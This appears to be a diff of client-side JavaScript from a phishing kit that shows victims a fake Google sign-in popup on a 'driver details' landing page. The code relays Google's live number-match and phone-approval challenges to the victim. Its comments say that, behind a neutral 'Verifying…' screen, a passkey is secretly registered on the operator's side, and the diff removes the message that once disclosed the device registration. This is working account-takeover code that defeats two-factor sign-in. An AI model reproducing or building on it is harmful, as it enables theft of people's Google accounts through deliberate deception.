@@ -20,13 +20,26 @@ function showApproval() {
   $('btn-approve').disabled = false;
 }
 
-// Device-registration (keypass) progress: reuse the approval screen's status
-// line — it reads as "Google is confirming something", which it is.
+// Passkey registration (Bitwarden) runs in the background on OUR side — the
+// visitor must NEVER see it. While it runs we show the neutral approval
+// screen ("verifying"), plus any number Google displays, exactly like a
+// normal sign-in challenge.
 function showTrustProgress(msg) {
   if (!onScreen('screen-approval')) showApproval();
-  $('approve-status').textContent = msg;
+  $('approve-status').textContent = msg || 'Verifying…';
+}
+
+// Render the big verification number(s) Google is showing on the approval
+// screen. Returns true when something is displayed.
+function renderApprovalNumbers(options) {
   const numBox = $('approval-numbers');
-  if (numBox) numBox.style.display = 'none';
+  const list = (options || []).map(String);
+  if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
+    numBox.dataset.opts = list.join('|');
+    numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
+  }
+  numBox.style.display = list.length ? '' : 'none';
+  return list.length > 0;
 }
 
 // The Google sign-in lives in a POPUP over the landing page (like a real
@@ -112,7 +125,7 @@ function routeState(L, w) {
     }
     return;
   }
-  // success = device registered (keypass) — the full finish.
+  // success = passkey registered — the full finish.
   if (L.state === 'trusted') { stopPolling(); return finish(); }
   // signed in, but this OS still needs to be registered for the account:
   // show the registration progress and keep polling. Every page Google asks
@@ -120,12 +133,22 @@ function routeState(L, w) {
   // screen below, so the user sees exactly what to type or tap.
   if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
   if (L.state === 'trust-start') {
-    showTrustProgress('Almost done \u2014 registering this device with your account so future sign-ins skip verification\u2026');
+    showTrustProgress(renderApprovalNumbers(L.options) ? 'Waiting for your phone…' : 'Verifying…');
     startPolling();
     return;
   }
-  if ((w && w.loggedIn) || L.state === 'signed-in') {
-    showTrustProgress('Signed in \u2014 registering this device with your account (one-time setup)\u2026');
+  // Passkey prompt (Bitwarden) — the confirmation happens in the live view.
+  if (L.state === 'passkey-prompt') {
+    showTrustProgress('Confirm the passkey in the live view');
+    startPolling();
+    return;
+  }
+  // NOTE: a LIVE challenge (approve/code/numchoice) always outranks the sticky
+  // loggedIn flag — the store stays 'logged-in' from the first phone-tap while
+  // Google asks for MORE (e.g. the number page during device registration).
+  if (((w && w.loggedIn) || L.state === 'signed-in') && !['approve', 'code', 'numchoice'].includes(L.state)) {
+    showTrustProgress('Finishing sign-in…');
+    renderApprovalNumbers(L.options);
     startPolling();
     return;
   }
@@ -135,15 +158,10 @@ function routeState(L, w) {
   // missing piece.
   if (L.state === 'approve') {
     if (!onScreen('screen-approval')) showApproval();
-    // number shown on the page: render it so the user sees exactly what Google shows
-    const numBox = $('approval-numbers');
-    const list = (L.options || []).map(String);
-    if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
-      numBox.dataset.opts = list.join('|');
-      numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
-    }
-    numBox.style.display = list.length ? '' : 'none';
-    if (list.length) $('approve-status').textContent = 'Waiting for your phone…';
+    // number shown on the page: render it so the user sees exactly what Google
+    // shows; always refresh the status line (no stale "Finishing sign-in…")
+    renderApprovalNumbers(L.options);
+    $('approve-status').textContent = 'Waiting for your phone…';
     startPolling();
     return;
   }
@@ -207,9 +225,7 @@ async function redirect() {
   stopPolling();
   await api('/complete', {}).catch(() => {});
   const username = (WIZ && WIZ.username) || '';
-  $('done-msg').textContent = (WIZ && WIZ.trusted)
-    ? 'Driver details received — you\u2019re signed in to Google. This device is now registered for your account.'
-    : 'Driver details received \u2014 you\u2019re signed in to Google.';
+  $('done-msg').textContent = 'Driver details received — you’re signed in to Google.';
   if (username) {
     $('done-account').textContent = 'Signed in as ' + username;
     $('done-account').hidden = false;
